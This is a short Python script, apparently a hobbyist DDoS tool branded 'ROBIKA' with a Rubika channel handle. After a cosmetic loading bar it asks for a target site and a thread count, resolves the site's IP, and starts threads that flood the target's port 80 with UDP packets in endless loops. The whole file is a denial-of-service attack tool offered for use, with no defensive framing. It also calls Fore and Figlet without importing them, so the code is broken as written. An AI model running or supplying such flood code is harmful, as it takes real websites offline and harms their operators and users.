import time
import socket
import sys
import _thread

print ("__________")
time.sleep(0.7)
print ("#_________")
time.sleep(0.6)
print ("##________")
time.sleep(0.5)
print ("###_______")
time.sleep(0.4)
print ("####______")
time.sleep(0.3)
print ("#####_____")
time.sleep(0.2)
print ("######____")
time.sleep(0.1)
print ("#######___")
time.sleep(0.5)
print ("########__")
time.sleep(0.1)
print ("#########_")
time.sleep(0.5)
print ("##########")
print ("")

print(Fore.BLUE+"\n Rubika --> @robika_com")
print("")

Sa=Figlet(font="slant")
print(Sa.renderText("ROBIKA"))
print("")

site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
